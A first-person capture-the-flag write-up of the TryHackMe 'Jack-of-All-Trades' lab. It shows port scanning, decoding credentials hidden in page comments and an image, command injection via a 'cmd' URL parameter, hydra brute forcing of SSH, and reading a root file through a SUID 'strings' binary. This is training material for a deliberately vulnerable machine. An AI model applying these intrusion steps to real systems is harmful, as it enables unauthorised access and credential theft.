## Jack-of-All-Trades

Room link: https://tryhackme.com/room/jackofalltrades

## Scanning
Like I always do, I started with an aggressive NMAP scan using ```-A```.  
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A [Remote IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-21 09:38 EST
Nmap scan report for [Remote IP]
Host is up (0.092s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.81 seconds
```
## Enumeration 
It appeared the only services running were SSH and HTTP, but they had switched ports! When I tried to navigate to the http service hosted on port 22, Firefox gave me an error: ```This address is restricted```. Doing some outside research, it appeared that Firefox did not allow network connections on restricted ports like 22. Within Firefox's settings there was a ```network.security.ports.banned.override``` preference which can be changed to allow connections on restricted ports like 22. According to Mozilla's documentation,```"Ports are used when any program accesses the Internet so that the system can keep separate applications' data separate. Some port numbers are reserved for functions such as e-mail or FTP. To prevent potential security risks if a protocol was allowed access a port reserved for a seperate protocol, Gecko applications contain a list of banned ports. This preference allows you to unban a port banned by default and therefore prevent the "Access to the port number given has been disabled for security reasons." or "This address uses a network port which is normally used for purposes other than Web browsing. Firefox has canceled the request for your protection." messages. "``` I used this site to change the preference: https://www.specialagentsqueaky.com/blog-post/r5iwj96j/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/. 

Now with the ability to connect to the site, there was a base64 string within the html that hinted at some credentials to be used at ```/recovery.php```. 
```
ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.141.123:22
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  [REDACTED] -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```
Converting the string base64, it provided a password that can be used somewhere. There was no clear username though. 
```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [REDACTED]
```
I also ran gobuster to see if there was anything else of interest on the http service. It didnt appear so. 
```
ajread@aj-ubuntu:~/TryHackMe$ gobuster -u http://[REDACTED]:22 -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://[REDACTED]:22/
[+] Threads      : 10
[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/02/21 15:33:36 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/assets (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
=====================================================
2022/02/21 15:34:27 Finished
=====================================================
```
## Initial Access
I accessed the ```/recovery.php``` directory and found a basic login screen. I tried the user:password credentials that were found in the homepage. But, I was not able to authenticate. When I curl'd the ```/recovery.php``` page, it provided an interesting encoded string. 
```
ajread@aj-ubuntu:~/TryHackMe$ curl http://10.10.141.123:22/recovery.php
		
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- [REDACTED] -->
		 
	</body>
</html>
```
Dropping the string into cyberchef (https://gchq.github.io/CyberChef/), it automatically detected the string was base32. However, I needed to do some manual testing to find it was both base32 encoded and ROT13 encoded. The decoded string pointed to credentials that were stored on the homepage with a hint. 
```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```
Based on the hint, the credentials must be stored within one of the jpg images located on the site using steganography. I downloaded all 3 images and ran steghide on each. The header appeared to be the image with the credentials stored, called cms.creds, within. For steghide (http://steghide.sourceforge.net/documentation/manpage.php), I used the password found on the homepage as the passphrase.
```
ajread@aj-ubuntu:~/TryHackMe/practice$ steghide extract -sf header.jpg 
Enter passphrase: 
wrote extracted data to "cms.creds".
ajread@aj-ubuntu:~/TryHackMe/practice$ cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: [REDACTED]
Password: [REDACTED]
```
With the credentials, I went back to the recovery page to login. Out of curiosity, I also tried to ssh with the user credentials and was unsuccessful.

After I logged in, I was prompted with a page that only says: ```GET me a 'cmd' and I'll run it for you Future-Jack.```. Could this site be vulnerable to directory traversal and code injection? Could it be?? It looked like I had to use some ```cmd=``` within the url to navigate around the machine.  I first ran ```http://[REDACTED]:22/nnxhweOV/index.php?cmd=id``` to test directory traversal/code injection and it worked!
```
GET me a 'cmd' and I'll run it for you Future-Jack. uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
I needed to move over to user jack in order to get the first flag. I looked around on the site to see if there are any credentials hidden anywhere for jack. There appeared to be none. When I moved over to the ```/home``` directory of the machine using ```http://[REDACTED]:22/nnxhweOV/index.php?cmd=cd /home;ls``` I found something interesting: a file named ```jacks_password_list```. Maybe these are possible passwords for user jack? 

I copied the list of passwords over to a txt file named ```passlist.txt``` and ran hydra from my local machine to try to brute force jack's ssh password. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ hydra -s 80 -l jack -P passlist.txt [REDACTED] -t 4 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-21 16:18:04
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:1/p:25), ~7 tries per task
[DATA] attacking ssh://[REDACTED]:80/
[80][ssh] host: [REDACTED]   login: jack   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-21 16:18:10
```
I got creds! 
```
ajread@aj-ubuntu:~/TryHackMe$ ssh jack@[REDACTED] -p 80
jack@10.10.141.123's password: 
jack@jack-of-all-trades:~$ 
```
There was a ```user.jpg``` file within the home directory of jack. I wanted to look at the jpg on my local machine so I copied it over using SCP (https://linuxize.com/post/how-to-use-scp-command-to-securely-transfer-files/), which is a nice tool if you have credentials and can use SSH. 

```
ajread@aj-ubuntu:~/TryHackMe/practice$ scp -P 80 jack@[REDACTED]:/home/jack/user.jpg .
jack@[REDACTED]'s password: 
user.jpg                                          100%  286KB 614.4KB/s   00:00 ```

```
The jpg was a recipe for Penguin Soup with one of the ingredients being the user flag! 

## Privilege Escalation 
I checked to see if jack could run any commands as sudo.
```
jack@jack-of-all-trades:~$ sudo -l
[sudo] password for jack: 
Sorry, user jack may not run sudo on jack-of-all-trades.
```
It appeared not. The next step was to get for easy SUID bits. 
```
jack@jack-of-all-trades:~$ find / -perm +4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
```
Great! It looked like ```strings``` was able to be run as root (```/usr/bin/strings```). 
```
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: [REDACTED]
```
And found the root flag! 